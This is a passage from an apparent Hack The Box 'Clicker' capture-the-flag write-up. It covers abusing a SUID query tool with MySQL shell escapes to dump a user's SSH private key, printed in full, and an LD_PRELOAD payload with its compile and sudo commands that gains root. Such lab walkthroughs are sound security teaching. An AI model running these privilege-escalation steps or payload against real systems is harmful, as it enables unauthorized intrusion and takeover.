        ON DUPLICATE KEY UPDATE username=username
--------------

www-data@clicker:/opt/manage$ ./execute_query 5 create.sql
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------

www-data@clicker:/opt/manage$
```

That means we can execute every file inside the MySQL command of the program. For example, we can create our own file:
```
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../tmp/players      
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
select * from players
--------------

username        nickname        password        role    clicks  level
admin   admin   ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82        Admin   999999999999999999      999999999
ButtonLover99   ButtonLover99   55d1d58e17361fe78a61a96847b0e0226a0bc1a4e38a7b167c10b5cf513ca81f        User    10000000        100
Paol    Paol    bff439c136463a07dac48e50b31a322a4538d1fac26bfb5fd3c48f57a17dabd3        User    2776354 75
Th3Br0  Th3Br0  3185684ff9fd84f65a6c3037c3214ff4ebdd0e205b6acea97136d23407940c01        User    87947322        1
www-data@clicker:/opt/manage$
```

Also the `execute_query` file has a SUID and GUID bit set for the user and group `jack`:
```
www-data@clicker:/opt/manage$ ls -al execute_query 
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
www-data@clicker:/opt/manage$
```

So the commands are runned with the privileges of the user `jack`.

### Exploitation
Putting things together, we can execute any SQL code that we want in the context of the user `jack`. 

Inside MySQL we can also run CLI commands with the alias `! command`. For example we can create this file:
```
www-data@clicker:/opt/manage$ echo "\! ls -al /home/jack/" > /tmp/exploit                     
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../tmp/exploit     
mysql: [Warning] Using a password on the command line interface can be insecure.
total 48
drwxr-x--- 7 jack jack 4096 Dec 11 19:19 .
drwxr-xr-x 3 root root 4096 Sep  5 19:19 ..
lrwxrwxrwx 1 root root    9 Sep  5 18:46 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jack jack 3771 Jan  6  2022 .bashrc
drwx------ 2 jack jack 4096 Sep  5 19:19 .cache
drwx------ 3 jack jack 4096 Sep  5 19:19 .gnupg
drwxrwxr-x 3 jack jack 4096 Sep  5 19:19 .local
lrwxrwxrwx 1 root root    9 Aug 30 14:36 .mysql_history -> /dev/null
-rw-r--r-- 1 jack jack  839 Feb 27  2023 .profile
drwx------ 2 jack jack 4096 Sep  5 19:19 .ssh
-rw-r--r-- 1 jack jack    0 Dec 11 16:58 .sudo_as_admin_successful
-rw------- 1 jack jack  988 Dec 11 19:19 .viminfo
drwx------ 2 jack jack 4096 Sep  5 19:19 queries
-rw-r----- 1 root jack   33 Dec 11 02:05 user.txt
www-data@clicker:/opt/manage$
```

Nice we got the user flag. But our goal is still to become the user. So let's look through his home directory first.

If we take look inside the `.ssh` folder we find a private key:
```
www-data@clicker:/opt/manage$ echo "\! ls -al /home/jack/.ssh" > /tmp/exploit
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../tmp/exploit         
mysql: [Warning] Using a password on the command line interface can be insecure.
total 16
drwx------ 2 jack jack 4096 Sep  5 19:19 .
drwxr-x--- 7 jack jack 4096 Dec 11 19:19 ..
-rw-r--r-- 1 jack jack  566 Feb 25  2023 authorized_keys
-rw------- 1 jack jack 2602 Feb 25  2023 id_rsa
www-data@clicker:/opt/manage$ echo "\! cat /home/jack/.ssh/id_rsa" > /tmp/exploit            
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../tmp/exploit              
mysql: [Warning] Using a password on the command line interface can be insecure.
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
www-data@clicker:/opt/manage$
```
Perfect!

Using this key we can login via SSH:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ ssh -i id_rsa jack@$IP
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Dec 11 09:28:46 PM UTC 2023

  System load:  0.083984375       Processes:             263
  Usage of /:   53.7% of 5.77GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.232
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Dec 11 18:38:58 2023 from 10.10.14.243
jack@clicker:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
jack@clicker:~$
```

And grab the user flag:
```
jack@clicker:~$ cat user.txt 
df0beeeeef4d5b485046e9a39f4db1e6
jack@clicker:~$ 
```

## Root flag
### Enumeration
A quick look inside the sudo rights of the user reveals the following:
```
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
jack@clicker:~$
```

We have full sudo right. Unfortunate we don't have the password of the user jet. But the second entry has the `NOPASSWD` option. We can run the script `/opt/monitor.sh` that we already saw earlier. Let's take a look in it:
```sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

The script runs the diagnostic interface of the web application and writes it inside the root directory. The request responses with the following data:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token > diagnostic.xml

┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ xml_pp diagnostic.xml
<?xml version="1.0"?>
<data>
  <timestamp>1702332253</timestamp>
  <date>2023/12/11 10:04:13pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1161</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:26719</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>e5f966c5dbf34cb5a1af3e2c74c39352</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>

┌──(kali㉿kali)-[~/Desktop/hackthebox/clicker]
└─$ 
```

But nothing too interesting for us.

### Privilege escalation
Taking a closer look into the sudo rights we can see that the option `SETENV` is set for the command:
```
(root) SETENV: NOPASSWD: /opt/monitor.sh
```

From the sudoers manpage:
```
SETENV and NOSETENV

[...]

If SETENV has  been  set  for  a command,  the  user may disable the env_reset flag from the command line via the -E option.  Additionally, environment variables set on the command line are not subject to the restrictions  imposed  by  env_check, env_delete,  or  env_keep.

[...]
```

Meaning that we are able to set environment variables for the execution, and they won't be reset. That gives us many options.

_See also https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv or https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/_

Manipulating the `PATH` variable is not really an option here since all commands are executed over their absolute path.

The `LD_PRELOAD` variable is way more interesting. Here we can set a path to a shared object that will be loaded before any other library (_see also https://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick#426260_).

In our case that means that we can load any shared object with root privileges before the script executes. For example, we can use this payload to get a shell:
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	}
```
_source: https://systemweakness.com/linux-privilege-escalation-with-ld-preload-sudo-a13e0b755ede_

We can compile it on our attacking machine:
```
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```

And copy the shared object file afterwards onto the target. 

We can now use the following command to make use of the payload:
```
jack@clicker:/opt$ sudo -E LD_PRELOAD=/tmp/exploit.so ./monitor.sh 
root@clicker:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@clicker:/opt# 
```

### Root flag
We can now read out the root flag and finish this machine:
```
root@clicker:/opt# cat /root/root.txt 
a313410c5cadf4e2ca2e338b87afd39c
root@clicker:/opt# 
```